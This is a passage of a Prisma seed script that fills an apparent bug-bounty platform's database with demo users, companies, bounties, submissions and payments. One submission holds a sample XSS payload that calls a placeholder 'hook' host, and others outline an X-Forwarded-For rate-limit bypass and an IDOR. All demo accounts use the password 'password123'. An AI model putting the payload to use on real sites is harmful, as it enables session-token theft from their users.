import { Prisma, PrismaClient } from '@prisma/client';
import bcrypt from 'bcrypt';

const prisma = new PrismaClient();

async function main() {
  console.log('🌱 Starting database seeding...');

  await prisma.$transaction([
    prisma.auditLog.deleteMany(),
    prisma.platformStats.deleteMany(),
    prisma.notification.deleteMany(),
    prisma.report.deleteMany(),
    prisma.payment.deleteMany(),
    prisma.comment.deleteMany(),
    prisma.submission.deleteMany(),
    prisma.bounty.deleteMany(),
    prisma.companyMember.deleteMany(),
    prisma.company.deleteMany(),
    prisma.user.deleteMany(),
  ]);

  console.log('🧹 Cleared existing data');

  const hashedPassword = await bcrypt.hash('password123', 10);

  const createdUsers = await Promise.all([
    prisma.user.create({
      data: {
        email: 'alice.hunter@example.com',
        username: 'alice_hunter',
        passwordHash: hashedPassword,
        role: 'BOUNTY_HUNTER',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Alice Hunter',
        bio: 'Security researcher specializing in web vulnerabilities',
        country: 'USA',
        totalEarnings: new Prisma.Decimal('128.456789123'), // SOL
        totalBounties: 18,
        reputation: 96.4,
        rank: 1,
        githubUrl: 'https://github.com/alicehunter',
        twitterUrl: 'https://twitter.com/alicehunter',
        walletAddress: 'AL1C3HunTerWallet1111111111111111111111111',
        lastLoginAt: new Date(),
      },
    }),
    prisma.user.create({
      data: {
        email: 'bob.security@example.com',
        username: 'bob_security',
        passwordHash: hashedPassword,
        role: 'BOUNTY_HUNTER',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Bob Security',
        bio: 'Blockchain and smart contract auditor focused on DeFi',
        country: 'Canada',
        totalEarnings: new Prisma.Decimal('98.754321987'), // SOL
        totalBounties: 14,
        reputation: 89.2,
        rank: 2,
        linkedinUrl: 'https://linkedin.com/in/bobsecurity',
        walletAddress: 'B0BsecureWallet22222222222222222222222222',
        otp: '427193',
        otpExpiry: new Date(Date.now() + 5 * 60 * 1000),
      },
    }),
    prisma.user.create({
      data: {
        email: 'charlie.pentest@example.com',
        username: 'charlie_pentest',
        passwordHash: hashedPassword,
        role: 'BOUNTY_HUNTER',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Charlie Pentest',
        bio: 'Mobile app security specialist and fuzzing enthusiast',
        country: 'UK',
        totalEarnings: new Prisma.Decimal('64.112233445'), // SOL
        totalBounties: 9,
        reputation: 84.1,
        rank: 4,
        portfolioUrl: 'https://charliepentest.com',
        walletAddress: 'CharLieM0b1leWallet3333333333333333333333',
      },
    }),
    prisma.user.create({
      data: {
        email: 'dana.mobile@example.com',
        username: 'dana_mobile',
        passwordHash: hashedPassword,
        role: 'BOUNTY_HUNTER',
        status: 'SUSPENDED',
        emailVerified: false,
        fullName: 'Dana Mobile',
        bio: 'Independent researcher focusing on performance bugs',
        country: 'Germany',
        totalEarnings: new Prisma.Decimal('12.500000000'), // SOL
        totalBounties: 3,
        reputation: 61.3,
        walletAddress: 'DanaSusp3ndedWallet444444444444444444444',
        resetToken: 'reset-token-demo',
        resetTokenExpiry: new Date(Date.now() + 60 * 60 * 1000),
      },
    }),
    prisma.user.create({
      data: {
        email: 'sarah.ceo@techcorp.com',
        username: 'sarah_ceo',
        passwordHash: hashedPassword,
        role: 'COMPANY_ADMIN',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Sarah Johnson',
        bio: 'CEO of TechCorp, passionate about secure software',
        country: 'USA',
        walletAddress: 'SarahCEOwallet55555555555555555555555555',
      },
    }),
    prisma.user.create({
      data: {
        email: 'mike.security@fintech.com',
        username: 'mike_security',
        passwordHash: hashedPassword,
        role: 'COMPANY_ADMIN',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Mike Chen',
        bio: 'Head of Security at FinTech Solutions',
        country: 'Singapore',
        walletAddress: 'MikeChenWallet6666666666666666666666666',
      },
    }),
    prisma.user.create({
      data: {
        email: 'olivia.ops@chainguard.io',
        username: 'olivia_ops',
        passwordHash: hashedPassword,
        role: 'COMPANY_ADMIN',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Olivia Reyes',
        bio: 'Operations lead at ChainGuard Labs',
        country: 'Spain',
        walletAddress: 'OliviaChainGuardWallet777777777777777',
      },
    }),
    prisma.user.create({
      data: {
        email: 'ethan.root@vulnera.dev',
        username: 'ethan_root',
        passwordHash: hashedPassword,
        role: 'ADMIN',
        status: 'ACTIVE',
        emailVerified: true,
        fullName: 'Ethan Root',
        bio: 'Platform administrator overseeing security operations',
        country: 'USA',
        walletAddress: 'EthanRootAdminWallet88888888888888888888',
      },
    }),
  ]);

  const [alice, bob, charlie, dana, sarah, mike, olivia, ethan] = createdUsers;
  console.log('✅ Created users');

  const createdCompanies = await Promise.all([
    prisma.company.create({
      data: {
        name: 'TechCorp',
        slug: 'techcorp',
        description: 'Leading technology company focused on secure software development',
        website: 'https://techcorp.com',
        walletAddress: 'So111111111111111111111111111111111111112',
        smartContractAddress: 'SC11111111111111111111111111111111111112',
        industry: 'Technology',
        companySize: '250-500',
        location: 'San Francisco, CA',
        totalBountiesFunded: new Prisma.Decimal('310.250000000'), // SOL
        totalBountiesPaid: new Prisma.Decimal('168.750000000'), // SOL
        activeBounties: 3,
        resolvedVulnerabilities: 18,
        reputation: 95.5,
        isVerified: true,
        isActive: true,
      },
    }),
    prisma.company.create({
      data: {
        name: 'FinTech Solutions',
        slug: 'fintech-solutions',
        description: 'Financial technology company revolutionizing digital payments',
        website: 'https://fintech-solutions.com',
        walletAddress: 'So222222222222222222222222222222222222223',
        smartContractAddress: 'SC22222222222222222222222222222222222223',
        industry: 'Finance',
        companySize: '150-250',
        location: 'Singapore',
        totalBountiesFunded: new Prisma.Decimal('512.500000000'), // SOL
        totalBountiesPaid: new Prisma.Decimal('342.300000000'), // SOL
        activeBounties: 2,
        resolvedVulnerabilities: 24,
        reputation: 93.2,
        isVerified: true,
        isActive: true,
      },
    }),
    prisma.company.create({
      data: {
        name: 'ChainGuard Labs',
        slug: 'chainguard-labs',
        description: 'Security firm managing blockchain infrastructure across chains',
        website: 'https://chainguard.io',
        walletAddress: 'So333333333333333333333333333333333333334',
        smartContractAddress: 'SC33333333333333333333333333333333333334',
        industry: 'Security',
        companySize: '50-100',
        location: 'Madrid, Spain',
        totalBountiesFunded: new Prisma.Decimal('128.400000000'), // SOL
        totalBountiesPaid: new Prisma.Decimal('88.000000000'), // SOL
        activeBounties: 1,
        resolvedVulnerabilities: 9,
        reputation: 88.7,
        isVerified: true,
        isActive: true,
      },
    }),
    prisma.company.create({
      data: {
        name: 'QuantumApps',
        slug: 'quantumapps',
        description: 'Mobile-first startup building encrypted communication tools',
        website: 'https://quantumapps.xyz',
        walletAddress: 'So444444444444444444444444444444444444445',
        smartContractAddress: 'SC44444444444444444444444444444444444445',
        industry: 'Communication',
        companySize: '25-50',
        location: 'Berlin, Germany',
        totalBountiesFunded: new Prisma.Decimal('52.750000000'), // SOL
        totalBountiesPaid: new Prisma.Decimal('20.125000000'), // SOL
        activeBounties: 0,
        resolvedVulnerabilities: 5,
        reputation: 72.3,
        isVerified: false,
        isActive: true,
      },
    }),
    prisma.company.create({
      data: {
        name: 'SecureLedger',
        slug: 'secureledger',
        description: 'Enterprise ledger tooling for compliance-focused blockchains',
        website: 'https://secureledger.io',
        walletAddress: 'So555555555555555555555555555555555555556',
        smartContractAddress: 'SC55555555555555555555555555555555555556',
        industry: 'Enterprise',
        companySize: '500+',
        location: 'Toronto, Canada',
        totalBountiesFunded: new Prisma.Decimal('680.000000000'), // SOL
        totalBountiesPaid: new Prisma.Decimal('405.500000000'), // SOL
        activeBounties: 2,
        resolvedVulnerabilities: 31,
        reputation: 85,
        isVerified: true,
        isActive: false,
      },
    }),
  ]);

  const [techCorp, fintechSolutions, chainGuard, quantumApps, secureLedger] = createdCompanies;
  console.log('✅ Created companies');

  await Promise.all([
    prisma.companyMember.create({
      data: {
        userId: sarah.id,
        companyId: techCorp.id,
        role: 'COMPANY_ADMIN',
        canCreateBounty: true,
        canReviewBounty: true,
        canApprovePayment: true,
        canManageMembers: true,
        invitedAt: new Date(Date.now() - 20 * 24 * 60 * 60 * 1000),
        joinedAt: new Date(Date.now() - 18 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.companyMember.create({
      data: {
        userId: mike.id,
        companyId: fintechSolutions.id,
        role: 'COMPANY_ADMIN',
        canCreateBounty: true,
        canReviewBounty: true,
        canApprovePayment: true,
        canManageMembers: true,
        invitedAt: new Date(Date.now() - 45 * 24 * 60 * 60 * 1000),
        joinedAt: new Date(Date.now() - 40 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.companyMember.create({
      data: {
        userId: olivia.id,
        companyId: chainGuard.id,
        role: 'COMPANY_ADMIN',
        canCreateBounty: true,
        canReviewBounty: true,
        canApprovePayment: false,
        canManageMembers: true,
        invitedAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000),
        joinedAt: new Date(Date.now() - 9 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.companyMember.create({
      data: {
        userId: bob.id,
        companyId: techCorp.id,
        role: 'COMPANY_ADMIN',
        canCreateBounty: false,
        canReviewBounty: true,
        canApprovePayment: false,
        canManageMembers: false,
        invitedAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
        joinedAt: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000),
      },
    }),
  ]);

  console.log('✅ Created company members');

  const now = new Date();

  const createdBounties = await Promise.all([
    prisma.bounty.create({
      data: {
        companyId: techCorp.id,
        title: 'Critical XSS Vulnerability in Login Form',
        description: 'DOM-based XSS reported in legacy login widget. Need reproduction and fix impact analysis.',
  bountyTypes: ['SECURITY'],
        targetUrl: 'https://techcorp.com/login',
        rewardAmount: new Prisma.Decimal('15.500000000'), // SOL
        status: 'ACTIVE',
        escrowAddress: 'Escrow1111111111111111111111111111111111111',
        inScope: ['techcorp.com', 'app.techcorp.com'],
        outOfScope: ['staging.techcorp.com', 'dev.techcorp.com'],
        requirements: 'Include sanitized payload examples and describe mitigation options.',
        guidelines: 'No automated scanning that may impact customer traffic.',
        startsAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        endsAt: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
        responseDeadline: 21,
        totalSubmissions: 4,
        validSubmissions: 2,
        paidOut: new Prisma.Decimal('11.250000000'),
        publishedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.bounty.create({
      data: {
        companyId: techCorp.id,
        title: 'API Rate Limiting Bypass',
        description: 'Investigate rate limiting bypass vectors using multi-tenant proxies.',
  bountyTypes: ['PERFORMANCE'],
        targetUrl: 'https://api.techcorp.com/v1',
        rewardAmount: new Prisma.Decimal('12.000000000'), // SOL
        status: 'ACTIVE',
        escrowAddress: 'Escrow2222222222222222222222222222222222222',
        inScope: ['api.techcorp.com'],
        outOfScope: ['sandbox.techcorp.com'],
        requirements: 'Document header manipulations and origin rotation strategies.',
        responseDeadline: 18,
        totalSubmissions: 2,
        validSubmissions: 1,
        paidOut: new Prisma.Decimal('0'),
        publishedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.bounty.create({
      data: {
        companyId: fintechSolutions.id,
        title: 'Smart Contract Audit - DeFi Vault',
        description: 'Full audit of Solana vault program focusing on liquidity withdrawal paths.',
  bountyTypes: ['SECURITY'],
        targetUrl: 'https://fintech-solutions.com/defi-vault',
        rewardAmount: new Prisma.Decimal('30.750000000'), // SOL
        status: 'ACTIVE',
        escrowAddress: 'Escrow3333333333333333333333333333333333333',
        inScope: ['programs on mainnet-beta'],
        outOfScope: ['test validators'],
        requirements: 'Share Anchor tests and highlight reentrancy guards.',
        responseDeadline: 28,
        totalSubmissions: 3,
        validSubmissions: 2,
        paidOut: new Prisma.Decimal('20.350000000'),
        publishedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.bounty.create({
      data: {
        companyId: chainGuard.id,
        title: 'Validator UI Accessibility Review',
        description: 'Accessibility improvements for validator monitoring dashboard.',
  bountyTypes: ['UI'],
        targetUrl: 'https://app.chainguard.io/validators',
        rewardAmount: new Prisma.Decimal('6.250000000'), // SOL
        status: 'CLOSED',
        escrowAddress: 'Escrow4444444444444444444444444444444444444',
        inScope: ['dashboard UI'],
        outOfScope: ['admin endpoints'],
        requirements: 'WCAG 2.1 AA compliance checklist.',
        responseDeadline: 14,
        totalSubmissions: 5,
        validSubmissions: 3,
        paidOut: new Prisma.Decimal('6.000000000'),
        startsAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
        endsAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
        closedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.bounty.create({
      data: {
        companyId: quantumApps.id,
        title: 'Push Notification Delivery Reliability',
        description: 'Identify bottlenecks impacting push delivery across regions.',
  bountyTypes: ['PERFORMANCE'],
        rewardAmount: new Prisma.Decimal('4.800000000'), // SOL
        status: 'EXPIRED',
        inScope: ['api.quantumapps.xyz'],
        outOfScope: ['legacy.quantumapps.xyz'],
        requirements: 'Share latency metrics and reproduction scripts.',
        responseDeadline: 10,
        totalSubmissions: 1,
        validSubmissions: 0,
        paidOut: new Prisma.Decimal('0'),
        startsAt: new Date(now.getTime() - 45 * 24 * 60 * 60 * 1000),
        endsAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.bounty.create({
      data: {
        companyId: secureLedger.id,
        title: 'Admin Portal Authorization Review',
        description: 'Verify strict role-based access on admin portal microservices.',
  bountyTypes: ['FUNCTIONALITY'],
        targetUrl: 'https://secureledger.io/admin',
        rewardAmount: new Prisma.Decimal('18.000000000'), // SOL
        status: 'ACTIVE',
        escrowAddress: 'Escrow5555555555555555555555555555555555555',
        inScope: ['admin APIs', 'admin UI'],
        outOfScope: ['marketing site'],
        requirements: 'List impacted roles and endpoints.',
        responseDeadline: 21,
        totalSubmissions: 0,
        validSubmissions: 0,
        paidOut: new Prisma.Decimal('0'),
        publishedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
      },
    }),
  ]);

  const [xssBounty, rateLimitBounty, defiVaultBounty, accessibilityBounty, pushReliabilityBounty, adminPortalBounty] = createdBounties;
  console.log('✅ Created bounties');

  const submissionOneSubmittedAt = new Date(now.getTime() - 4 * 24 * 60 * 60 * 1000);
  const submissionTwoSubmittedAt = new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000);
  const submissionThreeSubmittedAt = new Date(now.getTime() - 9 * 24 * 60 * 60 * 1000);
  const submissionFourSubmittedAt = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
  const submissionFiveSubmittedAt = new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000);
  const submissionSixSubmittedAt = new Date(now.getTime() - 12 * 24 * 60 * 60 * 1000);
  const submissionSevenSubmittedAt = new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000);

  const createdSubmissions = await Promise.all([
    prisma.submission.create({
      data: {
        bountyId: xssBounty.id,
        userId: alice.id,
        companyId: techCorp.id,
        title: 'DOM-based XSS exploit via legacy widget',
        description: 'Identified DOM sink accepting user supplied data without sanitization.',
  bountyType: xssBounty.bountyTypes[0],
        vulnerabilityType: 'Cross-Site Scripting',
        stepsToReproduce: '1. Inject payload in theme parameter\n2. Load page\n3. Observe script execution',
        impact: 'High - attacker can exfiltrate session tokens.',
        proofOfConcept: '<img src=x onerror="fetch(\'https://hook\')">',
        attachments: ['https://evidence.vulnera.dev/alice-xss.png'],
        aiSpamScore: 0.01,
        aiDuplicateScore: 0.12,
        aiAnalysisResult: { severity: 'CRITICAL', confidence: 0.92 },
        isAiFiltered: false,
        status: 'APPROVED',
        reviewedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        reviewedBy: sarah.id,
        reviewNotes: 'Confirmed. Mitigation rolled out to production.',
        rewardAmount: new Prisma.Decimal('11.250000000'), // SOL
        submittedAt: submissionOneSubmittedAt,
        responseDeadline: new Date(submissionOneSubmittedAt.getTime() + xssBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: rateLimitBounty.id,
        userId: bob.id,
        companyId: techCorp.id,
        title: 'Rate limiting bypass via header rotation',
        description: 'Able to rotate X-Forwarded-For to bypass per-IP limits.',
  bountyType: rateLimitBounty.bountyTypes[0],
        vulnerabilityType: 'Rate Limiting Bypass',
        stepsToReproduce: '1. Send bursts with distinct XFF header\n2. Observe unlimited calls',
        impact: 'Medium - potential brute force vector.',
        attachments: ['https://evidence.vulnera.dev/rate-limit.txt'],
        aiSpamScore: 0.05,
        aiDuplicateScore: 0.32,
        status: 'NEEDS_MORE_INFO',
        reviewedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        reviewedBy: sarah.id,
        reviewNotes: 'Need clarification on upstream proxy behavior.',
        responseDeadline: new Date(submissionTwoSubmittedAt.getTime() + rateLimitBounty.responseDeadline * 24 * 60 * 60 * 1000),
        submittedAt: submissionTwoSubmittedAt,
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: defiVaultBounty.id,
        userId: bob.id,
        companyId: fintechSolutions.id,
        title: 'Reentrancy vector in withdrawal path',
        description: 'Detected reentrancy path due to missing mutex in withdraw instruction.',
  bountyType: defiVaultBounty.bountyTypes[0],
        vulnerabilityType: 'Smart Contract',
        stepsToReproduce: '1. Deploy exploit program\n2. Chain withdraw calls\n3. Observe double spend',
        impact: 'Critical - vault drained.',
        attachments: ['https://evidence.vulnera.dev/defi-audit.pdf'],
        aiSpamScore: 0,
        aiDuplicateScore: 0.04,
        aiAnalysisResult: { severity: 'CRITICAL', recommendedFix: 'Add reentrancy guard' },
        status: 'APPROVED',
        reviewedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
        reviewedBy: mike.id,
        reviewNotes: 'Patched by adding mutex and tests.',
        rewardAmount: new Prisma.Decimal('20.350000000'), // SOL
        submittedAt: submissionThreeSubmittedAt,
        responseDeadline: new Date(submissionThreeSubmittedAt.getTime() + defiVaultBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: accessibilityBounty.id,
        userId: charlie.id,
        companyId: chainGuard.id,
        title: 'Improved contrast for validator charts',
        description: 'Adjusted color palette and ARIA labels for charts.',
  bountyType: accessibilityBounty.bountyTypes[0],
        vulnerabilityType: 'Accessibility',
        stepsToReproduce: '1. Run lighthouse accessibility audit\n2. Compare scores',
        impact: 'Low - quality of life improvement.',
        attachments: ['https://evidence.vulnera.dev/a11y-report.html'],
        status: 'APPROVED',
        reviewedAt: new Date(now.getTime() - 20 * 24 * 60 * 60 * 1000),
        reviewedBy: olivia.id,
        reviewNotes: 'Merged and deployed to production.',
        rewardAmount: new Prisma.Decimal('2.500000000'), // SOL
        submittedAt: submissionFourSubmittedAt,
        responseDeadline: new Date(submissionFourSubmittedAt.getTime() + accessibilityBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: pushReliabilityBounty.id,
        userId: dana.id,
        companyId: quantumApps.id,
        title: 'Duplicate unsupported vulnerability',
        description: 'Submission duplicated existing performance ticket.',
  bountyType: pushReliabilityBounty.bountyTypes[0],
        vulnerabilityType: 'Duplicate Finding',
        stepsToReproduce: 'N/A - duplicate of SUB-001',
        impact: 'None.',
        status: 'DUPLICATE',
        reviewedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        reviewedBy: olivia.id,
        rejectionReason: 'Duplicate of existing ticket SUB-44',
        submittedAt: submissionFiveSubmittedAt,
        responseDeadline: new Date(submissionFiveSubmittedAt.getTime() + pushReliabilityBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: accessibilityBounty.id,
        userId: dana.id,
        companyId: chainGuard.id,
        title: 'Spam submission with automated content',
        description: 'Random text generated by automation.',
  bountyType: accessibilityBounty.bountyTypes[0],
        vulnerabilityType: 'Spam',
        stepsToReproduce: 'N/A',
        impact: 'None',
        isAiFiltered: true,
        aiSpamScore: 0.98,
        aiDuplicateScore: 0.85,
        status: 'SPAM',
        reviewedAt: new Date(now.getTime() - 11 * 24 * 60 * 60 * 1000),
        reviewedBy: olivia.id,
        rejectionReason: 'Detected as spam by filters.',
        submittedAt: submissionSixSubmittedAt,
        responseDeadline: new Date(submissionSixSubmittedAt.getTime() + accessibilityBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.submission.create({
      data: {
        bountyId: adminPortalBounty.id,
        userId: charlie.id,
        companyId: secureLedger.id,
        title: 'IDOR on admin reporting endpoint',
        description: 'Improper authorization allows viewing other tenant reports.',
  bountyType: adminPortalBounty.bountyTypes[0],
        vulnerabilityType: 'Insecure Direct Object Reference',
        stepsToReproduce: '1. Authenticate as auditor\n2. Swap tenantId\n3. Fetch report data',
        impact: 'High - data exposure.',
        attachments: ['https://evidence.vulnera.dev/idor.mp4'],
        status: 'PENDING',
        submittedAt: submissionSevenSubmittedAt,
        responseDeadline: new Date(submissionSevenSubmittedAt.getTime() + adminPortalBounty.responseDeadline * 24 * 60 * 60 * 1000),
      },
    }),
  ]);

  const [xssSubmission, rateLimitSubmission, vaultSubmission, accessibilitySubmission, duplicateSubmission, spamSubmission, idorSubmission] = createdSubmissions;
  console.log('✅ Created submissions');

  const createdPayments = await Promise.all([
    prisma.payment.create({
      data: {
        submissionId: xssSubmission.id,
        userId: alice.id,
        companyId: techCorp.id,
        amount: new Prisma.Decimal('12.500000000'), // SOL
        platformFee: new Prisma.Decimal('0.625000000'), // SOL
        netAmount: new Prisma.Decimal('11.875000000'), // SOL
        txSignature: '5xssSig1111111111111111111111111111111111111',
        fromWallet: techCorp.walletAddress,
        toWallet: alice.walletAddress!,
        blockchainConfirmed: true,
        confirmations: 18,
        status: 'COMPLETED',
        initiatedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000 + 45 * 60 * 1000),
      },
    }),
    prisma.payment.create({
      data: {
        submissionId: vaultSubmission.id,
        userId: bob.id,
        companyId: fintechSolutions.id,
        amount: new Prisma.Decimal('20.350000000'), // SOL
        platformFee: new Prisma.Decimal('1.017500000'), // SOL
        netAmount: new Prisma.Decimal('19.332500000'), // SOL
        txSignature: '5vaultSig22222222222222222222222222222222222',
        fromWallet: fintechSolutions.walletAddress,
        toWallet: bob.walletAddress!,
        blockchainConfirmed: true,
        confirmations: 24,
        status: 'COMPLETED',
        initiatedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000 + 30 * 60 * 1000),
      },
    }),
    prisma.payment.create({
      data: {
        submissionId: accessibilitySubmission.id,
        userId: charlie.id,
        companyId: chainGuard.id,
        amount: new Prisma.Decimal('2.500000000'), // SOL
        platformFee: new Prisma.Decimal('0.125000000'), // SOL
        netAmount: new Prisma.Decimal('2.375000000'), // SOL
        txSignature: '5a11ySig3333333333333333333333333333333333',
        fromWallet: chainGuard.walletAddress,
        toWallet: charlie.walletAddress!,
        blockchainConfirmed: false,
        confirmations: 4,
        status: 'PROCESSING',
        initiatedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.payment.create({
      data: {
        submissionId: duplicateSubmission.id,
        userId: dana.id,
        companyId: quantumApps.id,
        amount: new Prisma.Decimal('0.000000000'), // SOL
        platformFee: new Prisma.Decimal('0.000000000'), // SOL
        netAmount: new Prisma.Decimal('0.000000000'), // SOL
        txSignature: '5dupSig4444444444444444444444444444444444',
        fromWallet: quantumApps.walletAddress,
        toWallet: dana.walletAddress!,
        blockchainConfirmed: false,
        confirmations: 0,
        status: 'FAILED',
        failureReason: 'Submission rejected as duplicate.',
        initiatedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000 + 20 * 60 * 1000),
      },
    }),
    prisma.payment.create({
      data: {
        submissionId: spamSubmission.id,
        userId: dana.id,
        companyId: chainGuard.id,
        amount: new Prisma.Decimal('1.000000000'), // SOL
        platformFee: new Prisma.Decimal('0.050000000'), // SOL
        netAmount: new Prisma.Decimal('0.950000000'), // SOL
        txSignature: '5spamSig5555555555555555555555555555555555',
        fromWallet: chainGuard.walletAddress,
        toWallet: dana.walletAddress!,
        blockchainConfirmed: false,
        confirmations: 0,
        status: 'REFUNDED',
        failureReason: 'Submission flagged as spam. Amount returned.',
        initiatedAt: new Date(now.getTime() - 8 * 24 * 60 * 60 * 1000),
        completedAt: new Date(now.getTime() - 8 * 24 * 60 * 60 * 1000 + 60 * 60 * 1000),
      },
    }),
  ]);

  await Promise.all([
    prisma.submission.update({
      where: { id: xssSubmission.id },
      data: { paymentId: createdPayments[0].id },
    }),
    prisma.submission.update({
      where: { id: vaultSubmission.id },
      data: { paymentId: createdPayments[1].id },
    }),
    prisma.submission.update({
      where: { id: accessibilitySubmission.id },
      data: { paymentId: createdPayments[2].id },
    }),
    prisma.submission.update({
      where: { id: duplicateSubmission.id },
      data: { paymentId: createdPayments[3].id },
    }),
    prisma.submission.update({
      where: { id: spamSubmission.id },
      data: { paymentId: createdPayments[4].id },
    }),
  ]);

  console.log('✅ Created payments');

  await Promise.all([
    prisma.comment.create({
      data: {
        submissionId: xssSubmission.id,
        userId: sarah.id,
        content: 'Thank you for the detailed report. Patch pushed to production.',
        isInternal: false,
      },
    }),
    prisma.comment.create({
      data: {
        submissionId: xssSubmission.id,
        userId: alice.id,
        content: 'Happy to help! Verified the mitigation in production as well.',
        isInternal: false,
      },
    }),
    prisma.comment.create({
      data: {
        submissionId: rateLimitSubmission.id,
        userId: sarah.id,
        content: 'Could you capture proxy headers for the affected requests?',
        isInternal: true,
      },
    }),
    prisma.comment.create({
      data: {
        submissionId: idorSubmission.id,
        userId: ethan.id,
        content: 'Escalated to SecureLedger response team for immediate attention.',
        isInternal: true,
      },
    }),
  ]);

  console.log('✅ Created comments');

  const createdReports = await Promise.all([
    prisma.report.create({
      data: {
        reporterId: alice.id,
        submissionId: rateLimitSubmission.id,
        type: 'OTHER',
        title: 'Follow-up on rate limiting next steps',
        description: 'Requesting update on mitigation timeline and if additional logs are needed.',
        evidence: ['https://reports.vulnera.dev/rate-limit-followup.md'],
        status: 'UNDER_INVESTIGATION',
        actionTaken: 'Assigned to TechCorp security team',
      },
    }),
    prisma.report.create({
      data: {
        reporterId: bob.id,
        reportedCompanyId: quantumApps.id,
        type: 'UNFAIR_REJECTION',
        title: 'Appeal duplicate decision',
        description: 'Submission flagged as duplicate but original ticket closed months ago.',
        evidence: ['https://reports.vulnera.dev/duplicate-appeal.pdf'],
        status: 'OPEN',
      },
    }),
    prisma.report.create({
      data: {
        reporterId: ethan.id,
        reportedUserId: dana.id,
        type: 'SPAM_SUBMISSION',
        title: 'Spam pattern detected',
        description: 'Multiple submissions from Dana flagged as spam by filters.',
        evidence: ['https://reports.vulnera.dev/spam-analysis.json'],
        status: 'RESOLVED',
        resolvedAt: new Date(now.getTime() - 6 * 24 * 60 * 60 * 1000),
        resolvedBy: ethan.id,
        resolution: 'User suspended pending manual review.',
        actionTaken: 'Account temporarily suspended',
      },
    }),
    prisma.report.create({
      data: {
        reporterId: olivia.id,
        reportedCompanyId: secureLedger.id,
        type: 'OTHER',
        title: 'Slow response on IDOR ticket',
        description: 'Escalating due to lack of response past SLA.',
        evidence: [],
        status: 'OPEN',
      },
    }),
  ]);

  console.log('✅ Created reports');

  await Promise.all([
    prisma.notification.create({
      data: {
        userId: alice.id,
        title: 'Bounty Reward Confirmed',
        message: 'You have received 11.875 SOL (net) for resolving the TechCorp XSS bounty.',
        type: 'PAYMENT',
        actionUrl: `/submissions/${xssSubmission.id}`,
        isRead: false,
      },
    }),
    prisma.notification.create({
      data: {
        userId: bob.id,
        title: 'Vault Audit Reward Completed',
        message: 'Your 19.3325 SOL payout for the DeFi vault audit is finalized.',
        type: 'PAYMENT',
        actionUrl: `/submissions/${vaultSubmission.id}`,
        isRead: true,
        readAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
      },
    }),
    prisma.notification.create({
      data: {
        userId: charlie.id,
        title: 'Payment Processing',
        message: 'ChainGuard Labs is processing 2.375 SOL for your accessibility improvements.',
        type: 'PAYMENT',
        actionUrl: `/submissions/${accessibilitySubmission.id}`,
        isRead: false,
      },
    }),
    prisma.notification.create({
      data: {
        userId: dana.id,
        title: 'Submission Marked as Duplicate',
        message: 'Your QuantumApps submission was marked duplicate and refunded in SOL.',
        type: 'SUBMISSION',
        actionUrl: `/submissions/${duplicateSubmission.id}`,
        isRead: true,
        readAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000),
      },
    }),
    prisma.notification.create({
      data: {
        userId: ethan.id,
        title: 'New Report Filed',
        message: 'Olivia Reyes filed a new report regarding SecureLedger SLA.',
        type: 'REPORT',
        actionUrl: `/reports/${createdReports[3].id}`,
        isRead: false,
      },
    }),
  ]);

  console.log('✅ Created notifications');

  await prisma.platformStats.createMany({
    data: [
      {
        date: new Date('2025-09-28'),
        totalUsers: 4200,
        newUsers: 28,
        activeUsers: 1380,
        totalCompanies: 145,
        newCompanies: 3,
        activeCompanies: 92,
        totalBounties: 680,
        activeBounties: 210,
        newBounties: 12,
        totalSubmissions: 1800,
        newSubmissions: 54,
        approvedSubmissions: 22,
        rejectedSubmissions: 15,
        totalVolume: new Prisma.Decimal('12580.450000000'), // SOL
